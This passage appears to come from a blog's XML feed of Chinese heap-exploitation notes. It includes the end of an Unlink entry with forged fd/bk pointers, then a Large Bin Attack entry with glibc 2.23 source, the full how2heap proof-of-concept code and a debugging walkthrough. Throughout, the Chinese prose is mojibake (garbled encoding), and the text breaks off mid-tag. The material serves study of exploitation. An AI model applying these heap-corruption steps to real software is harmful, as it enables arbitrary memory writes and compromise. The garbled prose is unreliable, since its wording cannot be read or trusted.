0x18 + 0x18 ä¹Ÿå°±æ˜¯ fake_chunk , è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ»¡è¶³æ¡ä»¶ ï¼ŒåŒç† fake_chunk çš„ bk è¦ç­‰äº fake_chunk - 0x10 , è¿™æ · fake_BK çš„é¦–åœ°å€ä¸º fake_chunk - 0x10 ï¼Œfake_BK çš„ fd å°±æ˜¯ fake_chunk - 0x10 + 0x10 ä¹Ÿå°±æ˜¯ fake_chunk ,è¿™æ ·å°±æ»¡è¶³äº†ä¹‹å‰çš„æ¡ä»¶ ï¼Œç»•è¿‡äº†æ£€æŸ¥ï¼ˆå¦‚æœè¿˜è§‰å¾—ç»•çš„è¯ï¼Œå¯ä»¥è‡ªå·±ç»˜å›¾æ¨ä¸€ä¸‹ï¼‰ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd = P - <span class="number">0x18</span></span><br><span class="line">P-&gt;bk = P - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æˆ‘ä»¬æœ€ç»ˆè¦ä¼ªé€ çš„ fd å’Œ bk ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†å½’çº³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Large Bin Attack</title>
      <link href="/2025/04/24/Large-Bin-Attack/"/>
      <url>/2025/04/24/Large-Bin-Attack/</url>
      
        <content type="html"><![CDATA[<h1 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h1><ul><li><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ :"></a>åŸºæœ¬æ¦‚å¿µ :</h2></li></ul><p>Large Bin æ˜¯ glibc å †å†…å­˜ç®¡ç†ä¸­çš„ä¸€ç§æ•°æ®ç»“æ„ï¼Œç”¨äºå­˜å‚¨è¾ƒå¤§å°ºå¯¸çš„ç©ºé—²å†…å­˜å—ï¼Œä¸€èˆ¬ç®¡ç†å¤§äº1024å­—èŠ‚çš„ç©ºé—²chunkï¼ˆ32-bit ç³»ç»Ÿ 512 å­—èŠ‚ï¼Œ64-bit ç³»ç»Ÿ 1024 å­—èŠ‚ï¼‰ã€‚</p><ul><li><h2 id="Large-Bin-çš„ç»“æ„"><a href="#Large-Bin-çš„ç»“æ„" class="headerlink" title="Large Bin çš„ç»“æ„ :"></a>Large Bin çš„ç»“æ„ :</h2></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Large Bin åœ¨ç»“æ„ä¸Šä¸å…¶ä»– Bins æœ‰æ‰€ä¸åŒï¼Œåœ¨æ‹¥æœ‰ prev_size ã€ size ä»¥åŠ fd ã€ bk çš„æƒ…å†µä¸‹ï¼Œ<strong>è¿˜å¤šäº†fd_nextsize å’Œ bk_nextsize ä¸¤ç§æŒ‡é’ˆç»“æ„</strong></p><ul><li>fd_nextsize è¡¨ç¤ºæŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰chunkå¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å«Binçš„å¤´æŒ‡é’ˆã€‚</li><li>bk_nextsize è¡¨ç¤ºæŒ‡å‘åä¸€ä¸ªä¸å½“å‰chunkå¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å«Binçš„å¤´æŒ‡é’ˆã€‚</li></ul><p>**ç»„æˆéƒ¨åˆ†:**Large Bins ä¸­å«æœ‰ 63 ä¸ªBins ï¼Œè€Œ Large Bins æ€»ä½“åˆè¢«åˆ†æˆ 6 ä¸ªç»„ ï¼Œ æ¯ä¸ªç»„å¯¹åº”ä¸€ä¸ªåŒºé—´ï¼Œä¸”å®¹çº³ä¸ªæ•°å‘ˆæŒ‡æ•°æ€§å‡å°‘ã€‚</p><p><img src="/../PWN/LargeBinAttack/1.png" alt="image-20250425150822345"></p><ul><li><h2 id="é“¾è¡¨ç»“æ„ï¼š"><a href="#é“¾è¡¨ç»“æ„ï¼š" class="headerlink" title="é“¾è¡¨ç»“æ„ï¼š"></a>é“¾è¡¨ç»“æ„ï¼š</h2><img src="/../PWN/LargeBinAttack/2.png" alt="image-20250425154611746"></li></ul><h3 id="è¡¥å……-ï¼š"><a href="#è¡¥å……-ï¼š" class="headerlink" title="è¡¥å…… ï¼š"></a>è¡¥å…… ï¼š</h3><p>åªæœ‰é¦–å †å—çš„fd_nextsizeã€bk_nextsizeä¼šæŒ‡å‘å…¶ä»–å¤§å°çš„å†…å­˜å—ï¼Œå…¶ç›¸åŒå¤§å°çš„éé¦–å †å—çš„fd_nextsizeã€bk_nextsizeæ— æ•ˆ ï¼Œé€šå¸¸ä¸º0ã€‚</p><ul><li><h2 id="æ’å…¥é¡ºåºï¼š"><a href="#æ’å…¥é¡ºåºï¼š" class="headerlink" title="æ’å…¥é¡ºåºï¼š"></a>æ’å…¥é¡ºåºï¼š</h2></li></ul><p><strong>LIBC-2.23æºç ï¼š</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(size)) </span><br><span class="line">&#123;</span><br><span class="line">  victim_index = smallbin_index(size);</span><br><span class="line">  bck = bin_at(av, victim_index);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  victim_index = largebin_index(size);</span><br><span class="line">  bck = bin_at(av, victim_index); </span><br><span class="line">  fwd = bck-&gt;fd; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line"></span><br><span class="line">      size |= PREV_INUSE;</span><br><span class="line">      assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line"></span><br><span class="line">          fwd = bck;</span><br><span class="line">          bck = bck-&gt;bk; </span><br><span class="line"></span><br><span class="line">          victim-&gt;fd_nextsize = fwd-&gt;fd; </span><br><span class="line"></span><br><span class="line">          victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; </span><br><span class="line"></span><br><span class="line">          fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"></span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">      &#123;</span><br><span class="line">          assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">              fwd = fwd-&gt;fd; </span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">          &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          bck = fwd-&gt;bk;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><ol><li>åœ¨ Large Bin ä¸­ ï¼Œå †å—çš„æ’åˆ—é¡ºåºæ˜¯ä»å¤§åˆ°å°ï¼Œè¶Šå¤§çš„å †å—è¶Šé è¿‘å¤´éƒ¨ï¼Œè¶Šå°çš„å †å—è¶Šé è¿‘å°¾éƒ¨ã€‚</li><li>å¤§å°ç›¸åŒçš„å †å— ï¼Œ æŒ‰ç…§ free çš„å…ˆåé¡ºåºæ’åº ï¼Œæœ€å…ˆé‡Šæ”¾çš„å †å—ä½œä¸ºé¦–å †å—ï¼Œå…¶æ¬¡é‡Šæ”¾çš„å †å—å»¶ç»­å¾€åã€‚</li></ol><h1 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h1><p>Large Bin Attack çš„æ”»å‡»æ–¹å¼åœ¨ä½ç‰ˆæœ¬glibc-2.23å’Œé«˜ç‰ˆæœ¬glibc-2.31æœ‰æ‰€ä¸åŒï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ’åˆ†ä¸ºä¸¤ä¸ªæ¿å—ï¼Œåˆ†åˆ«æ¥æè¿°å…¶æ”»å‡»æ‰‹æ³•ã€‚</p><h2 id="GLIBC-2-23-æ”»å‡»æ‰‹æ³•"><a href="#GLIBC-2-23-æ”»å‡»æ‰‹æ³•" class="headerlink" title="GLIBC-2.23 æ”»å‡»æ‰‹æ³•"></a>GLIBC-2.23 æ”»å‡»æ‰‹æ³•</h2><p>ä¸ºäº†ä¾¿äºç†è§£ï¼Œæœ¬æ–‡å°†ä½¿ç”¨<a href="https://github.com/shellphish/how2heap">how2heap</a>å…³äºLarge Bin Attackæ¼æ´åˆ©ç”¨çš„æºç è¿›è¡Œè°ƒè¯•åˆ†æã€‚</p><h4 id="how2heapæºç å±•ç¤ºï¼š"><a href="#how2heapæºç å±•ç¤ºï¼š" class="headerlink" title="how2heapæºç å±•ç¤ºï¼š"></a>how2heapæºç å±•ç¤ºï¼š</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(stack_var1 != <span class="number">0</span>);</span><br><span class="line">    assert(stack_var2 != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Large-Bin-Attack-çš„åˆ©ç”¨æ€è·¯ä»¥åŠå…¶ä½œç”¨ï¼š"><a href="#Large-Bin-Attack-çš„åˆ©ç”¨æ€è·¯ä»¥åŠå…¶ä½œç”¨ï¼š" class="headerlink" title="Large Bin Attack çš„åˆ©ç”¨æ€è·¯ä»¥åŠå…¶ä½œç”¨ï¼š"></a>Large Bin Attack çš„åˆ©ç”¨æ€è·¯ä»¥åŠå…¶ä½œç”¨ï¼š</h3><p>å†è¿›è¡Œä¸‹ä¸€æ­¥çš„è°ƒè¯•ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆçŸ¥é“ Large Bin Attack çš„åˆ©ç”¨æ€è·¯å’Œä½œç”¨ï¼Œæ‰èƒ½å¸®åŠ©æˆ‘ä»¬æ›´å¥½çš„ç†è§£ Large Bin Attack æ‰‹æ³•ï¼š</p><ul><li>åˆ©ç”¨æ€è·¯ï¼šé€šè¿‡çº‚æ”¹å·²é‡Šæ”¾çš„å¤§å †å—çš„ bk_nextsize æŒ‡é’ˆ ï¼Œ åœ¨ largebin çš„æ’å…¥è¿‡ç¨‹ä¸­ï¼Œåˆ©ç”¨å¤§å †å—çš„æ’åºæœºåˆ¶ ï¼Œå®ç° Large Bin Attackã€‚</li><li>ä½œç”¨ï¼šå¯ä»¥å®ç°ä»»æ„åœ°å€å†™å…¥å †å—åœ°å€ã€‚</li></ul><h3 id="Large-Bin-Attack-æºç è°ƒè¯•ï¼š"><a href="#Large-Bin-Attack-æºç è°ƒè¯•ï¼š" class="headerlink" title="Large Bin Attack æºç è°ƒè¯•ï¼š"></a>Large Bin Attack æºç è°ƒè¯•ï¼š</h3><p>ï¼ˆä¸ºäº†æ›´åŠ ä¾¿äºç†è§£ï¼Œæˆ‘ä¼šæŠŠè°ƒè¯•è¿‡ç¨‹æ‹†è§£æˆå‡ ä¸ªå¤§æ¿å—ï¼ŒåŒæ—¶åˆ†æ”¯ç»†åŒ–æˆæ•°ä¸ªå°æ¿å—ï¼‰</p><p><u>ç¬¬ä¸€æ­¥ï¼šç›®æ ‡åœ°å€ä»¥åŠå¤§å †å—çš„åˆ›å»º</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure><p><img src="/../PWN/LargeBinAttack/3.png" alt="image-20250426195629165"></p><p>åˆ›å»ºäº†ä¸¤ä¸ªå˜é‡ stack_var1 å’Œ stack_var2 ï¼Œä»¥åŠä¸‰ä¸ªå¤§å †å— p1ã€p2 å’Œ p3ï¼Œå¤§å°åˆ†åˆ«æ˜¯0x430ã€0x510ã€0x510 ï¼Œå…¶ä¸­æ¯ä¸ªå¤§å †å—ä»¥åŠ Top chunk ä¸­é—´éƒ½éš”äº†ä¸€ä¸ª0x30å°å †å—ï¼Œè¿™ä¸ªå°å †å—çš„ä½œç”¨æ˜¯é˜²æ­¢å¤§å †å—ä¹‹é—´ç›¸äº’åˆå¹¶ã€‚</p><p><strong>æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯å°† stack_var1 å’Œ stack_var2 çš„å€¼æ”¹å†™æˆå †å—çš„åœ°å€ï¼Œå¯ä»¥çœ‹åˆ°ç°åœ¨ä¸¤ä¸ªå˜é‡çš„å€¼éƒ½æ˜¯é›¶ ã€‚</strong></p><p><u>ç¬¬äºŒæ­¥ï¼šé‡Šæ”¾ p1 å’Œ p2 ï¼Œä½¿å…¶è¿›å…¥ unsorted binã€‚</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br></pre></td></tr></table></figure><p><img src="/../PWN/LargeBinAttack/4.png" alt="image-20250426195752913"></p><p><u>ç¬¬ä¸‰æ­¥ï¼šç”³è¯·ä¸€ä¸ªåˆé€‚å¤§å°çš„å †å—ï¼Œè§¦å‘ unsorted bin éå† ã€‚</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><hr><h4 id="unsorted-bin-ç›¸å…³æœºåˆ¶ï¼š"><a href="#unsorted-bin-ç›¸å…³æœºåˆ¶ï¼š" class="headerlink" title="unsorted bin ç›¸å…³æœºåˆ¶ï¼š"></a>unsorted bin ç›¸å…³æœºåˆ¶ï¼š</h4><p>æˆ‘ä»¬è¦ä½¿ unsorted bin è¿›å…¥ large bin ï¼Œ å°±è¦å…ˆçŸ¥é“unsorted binçš„ç›¸å…³æœºåˆ¶ï¼Œé€šå¸¸æˆ‘ä»¬é‡Šæ”¾ä¸€ä¸ªå †å—ï¼Œglibcä¼šå°è¯•ä¸å‰åå †å—å‘ç”Ÿåˆå¹¶ï¼Œåˆå¹¶åè‹¥étopchunkï¼Œä¸”å¤§å°è¶…è¿‡ unsorted bin çš„è®¾å®šé˜ˆå€¼ , å®ƒä¸ä¼šç«‹å³è¿›å…¥small bin &#x2F; large bin ä¸­ ï¼Œè€Œæ˜¯è¿›å…¥ unsorted bin ä¸­ç¼“å­˜èµ·æ¥ï¼ŒåŒæ—¶unsorted biné‡‡ç”¨**<u>å…ˆè¿›å…ˆå‡º</u>**çš„æ’å…¥å–å‡ºæ–¹å¼ã€‚</p><p>åœ¨è°ƒç”¨ä¸‹ä¸€æ¬¡ malloc(req_size) æ—¶ï¼Œé¦–å…ˆä¼šæ£€æŸ¥ fastbin ã€small bin ç„¶åæ‰åˆ° unsorted bin ï¼Œæ­¤æ—¶ä¼šä¾æ¬¡å–å‡º unsorted bin è¡¨å°¾éƒ¨çš„chunk(victim)ï¼Œå¦‚æœ chunksize(victim) æ°å¥½ç­‰äº req_size , å°±ä¼šç›´æ¥è¿”å›ï¼›å¦åˆ™å°±ä¼šæ ¹æ®å¤§å°é˜ˆå€¼ï¼ˆ64-bitç³»ç»Ÿ &lt;&#x3D; 1024å­—èŠ‚è¿›å…¥small bin ï¼Œ&gt;1024å­—èŠ‚è¿›å…¥large binï¼‰æ’å…¥ç›¸å¯¹åº”çš„ bin ä¸­ï¼Œå†ç»§ç»­å°è¯•ä¸‹ä¸€ä¸ª unsorted æ¡ç›® ã€‚</p><p>å¦‚æœ unsorted bin éå†ç»“æŸè¿˜æ²¡æœ‰æ‰¾åˆ°ç›¸åº”å¤§å°çš„å †å— ï¼Œå°±ä¼šä¾æ¬¡æœç´¢ small bins ã€ large bins ï¼Œè‹¥ä»æ— åˆé€‚çš„å †å—ï¼Œåˆ™è°ƒç”¨sysmallocï¼Œå‘ç³»ç»Ÿç”³è¯·æ–°çš„å †å—ç©ºé—´ã€‚</p><hr><p>æ ¹æ® unsorted bin ç›¸å…³æœºåˆ¶ ï¼Œç”±äºæˆ‘ä»¬ç”³è¯·çš„0x90å¤§å°çš„å †å—ä¼šä¼˜å…ˆæ£€æŸ¥fastbinå’Œsmall binï¼Œå‘ç°ä¸¤ä¸ªbinsä¸­éƒ½æ²¡æœ‰å †å—ï¼Œäºæ˜¯å°±è¿›å…¥ unsorted bin ä¸­è§¦å‘äº† unsorted bin éå† ï¼Œç”±äºunsorted bin å…ˆè¿›å…ˆå‡ºçš„è§„åˆ™ ï¼ŒP1 ä¼šå…ˆè¢«æˆ‘ä»¬æ‹¿å‡ºæ¥æ£€æŸ¥ ï¼Œå‘ç°å¤§å°ä¸ç­‰äºæˆ‘ä»¬éœ€è¦ç”³è¯·çš„0x90çš„å †å— ï¼Œäºæ˜¯æ ¹æ®å¤§å°é˜ˆå€¼(0x400)ï¼Œè¢«åˆ’å…¥äº† large bin å½“ä¸­ï¼Œç„¶åæ¥ç€å–å‡º P2 ï¼Œå‘ç°åŒæ ·ä¸æ»¡è¶³å¯¹åº”å¤§å° ï¼Œäºæ˜¯åŒæ ·è¿›å…¥äº†  large bin å½“ä¸­ï¼Œunsorted bin éå†ç»“æŸ ï¼Œå‘ç°æ²¡æœ‰åˆé€‚çš„ bin ï¼Œå°±ä¼šä¾æ¬¡æœç´¢ small bins ï¼Œlarge bins ï¼ŒåŒæ—¶åœ¨æœç´¢large binsçš„æ—¶å€™ï¼Œé‡‡å– Best-fit ç­–ç•¥ï¼Œä¹Ÿå°±æ˜¯å½“ç”³è¯·çš„å †å— &lt;&#x3D;large bin(min_chunk)æœ€å°å †å—çš„æ—¶å€™ï¼Œå°±ä¼šä¼˜å…ˆä»æœ€å°å †å—è¿›è¡Œåˆ†é… ã€‚</p><p>å¾ˆæ˜¾ç„¶ç”±äº P1 &#x3D; 0x430 , P2 &#x3D; 0x510 ï¼Œæ‰€ä»¥P1ä¼šè¢«æ‹¿å‡ºæ¥åˆ†é…å †å—ï¼Œç„¶ååˆ†é…å®Œå †å—çš„P1å°±ä¼šåˆè¢«é‡æ–°æ”¾å›unsorted binä¸­ã€‚</p><p><img src="/../PWN/LargeBinAttack/5.png" 